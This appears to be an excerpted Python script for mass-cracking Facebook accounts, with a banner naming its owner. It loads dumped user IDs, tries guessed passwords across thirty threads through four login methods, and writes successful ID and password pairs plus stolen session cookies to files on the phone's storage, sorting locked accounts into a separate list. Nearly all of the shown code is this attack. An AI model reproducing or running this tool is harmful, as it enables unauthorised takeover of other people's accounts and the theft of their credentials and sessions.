...
from concurrent.futures import ThreadPoolExecutor as sarfrazAIZAZ
...
sys.stdout.write('\x1b]2; AIZAZ\x07')
...
\033[1;37m Owner   :            Aizaz Khan

\033[1;37m Facebook:            Muhammad Aizaz

\033[1;37m Github  :            Aizazkhan0007

\033[1;37m Version :          \x1b[38;5;196m  Unavailable 
...
def result(OKs,cps):
    ...
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back AIZAZMenu ")
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/+923208796965')
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AIZAZb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AIZAZb};{ckkk}"

                    print(f"\r{R} [AIZAZ-OK] {sid} | {ps} {S}")

                    oks.append(sid)

                    open('/sdcard/AIZAZ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AIZAZ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')

                    break

                elif 'www.facebook.com' in q['error']['message']:

                     #print(f"\r{A} [AIZAZ-CP] {sid} | {ps} {S}")

                     cps.append(sid)

                     open('/sdcard/AIZAZ_CP.txt','a').write(sid+'|'+ps+'\n')
    ...
    def methodC(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[AIZAZ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/AIZAZ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AIZAZ_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
    ...
    def methodB(self, sid, name, psw):
        ...
        try:
            ...
            sys.stdout.write(f"\r {S}[AIZAZ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        ...
        sys.stdout.write(f"\r {S}[AIZAZ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/AIZAZ_OK.txt','a').write(sid+'|'+ps+'\n')
    ...
    def pasw(self):       
            ...
            with sarfrazAIZAZ(max_workers=30) as AIZAZworld:
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           ...
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                AIZAZworld.submit(self.methodA, uid, name, pwx)

                            elif 'methodB' in methods:

                                AIZAZworld.submit(self.methodB, uid, name, pwx)

                            elif 'methodC' in methods:

                                AIZAZworld.submit(self.methodC, uid, name, pwx)

                            elif 'methodD' in methods:

                                AIZAZworld.submit(self.methodD, uid, name, pwx)
...
def public():
    ...
    try:
        ...
        print(f'File Name To Dump Ids. Example /sdcard/AIZAZ.txt') 
...
def sids():
    ...
    print('\033[1;37mExample: /sdcard/AIZAZ.txt\033[0;97m')
...
def cutter():
    ...
    os.system('sort -r '+AIZAZ+' | uniq > '+sarfraz)

    os.system('clear')

    print(logo)

    print("Removed Successful From File : " + AIZAZ)
    ...
    input(f"{S} Press Enter To Back AIZAZMenu ")
...
def p_dump():
    ...
    try:
        ...
        print(f'{S}File Name To Dump Ids. Example /sdcard/AIZAZ.txt\n') 
